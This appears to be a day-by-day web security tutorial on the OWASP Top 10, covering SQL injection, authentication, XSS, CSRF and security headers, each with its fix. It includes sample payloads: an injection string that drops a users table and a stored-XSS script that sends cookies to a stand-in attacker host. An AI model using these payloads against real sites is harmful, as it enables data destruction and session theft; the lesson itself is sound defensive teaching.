# Day 32: Application Security & OWASP

## 1. Think Like a Hacker

You build walls. Hackers look for windows.
**OWASP Top 10** is the standard list of most critical web vulnerabilities.

### 1.1 Injection (SQLi)
*   **Attack**: `user_input = "'; DROP TABLE users; --"`
*   **Code**: `SELECT * FROM users WHERE name = '` + user_input + `'`
*   **Result**: The DB executes the drop command.
*   **Fix**: **Parameterized Queries** (Prepared Statements). Never concatenate strings for SQL.

### 1.2 Broken Authentication
*   **Attack**: Credential Stuffing (using leaked passwords), Brute Force, Session Hijacking.
*   **Fix**: MFA, Rate Limiting, Strong Password Policies, Secure Session Cookies.

### 1.3 Cross-Site Scripting (XSS)
*   **Attack**: Injecting malicious JS into your page.
    *   *Stored XSS*: Comment = `<script>fetch('http://hacker.com?cookie='+document.cookie)</script>`. Everyone who views the comment gets hacked.
    *   *Reflected XSS*: Link = `example.com?search=<script>...`.
*   **Fix**: **Escape Output**. React/Vue do this automatically. Content Security Policy (CSP).

---

## 2. CSRF (Cross-Site Request Forgery)

*   **Scenario**:
    1.  Alice is logged into `bank.com`.
    2.  Alice visits `evil.com`.
    3.  `evil.com` has a hidden form: `<form action="bank.com/transfer" method="POST">`.
    4.  JS submits the form.
    5.  Browser sends Alice's cookies to `bank.com`. Bank thinks Alice sent it.
*   **Fix**:
    *   **CSRF Token**: A random hidden field in the form that `evil.com` doesn't know.
    *   **SameSite Cookie**: `Set-Cookie: session=...; SameSite=Strict`. Browser won't send cookie on cross-site requests.

---

## 3. Security Headers

Tell the browser how to protect the user.
*   **Strict-Transport-Security (HSTS)**: "Always use HTTPS".
*   **Content-Security-Policy (CSP)**: "Only load scripts from my domain".
*   **X-Frame-Options**: "Don't let others put me in an iframe" (Clickjacking).
*   **X-Content-Type-Options**: "Don't guess file types" (MIME sniffing).

---

## 4. Summary

Today we locked the windows.
*   **Injection**: Use Prepared Statements.
*   **XSS**: Escape output. Use CSP.
*   **CSRF**: Use SameSite cookies.

**Tomorrow (Day 33)**: We will protect our keys. How to manage **Secrets** (API Keys, DB Passwords) without committing them to Git.
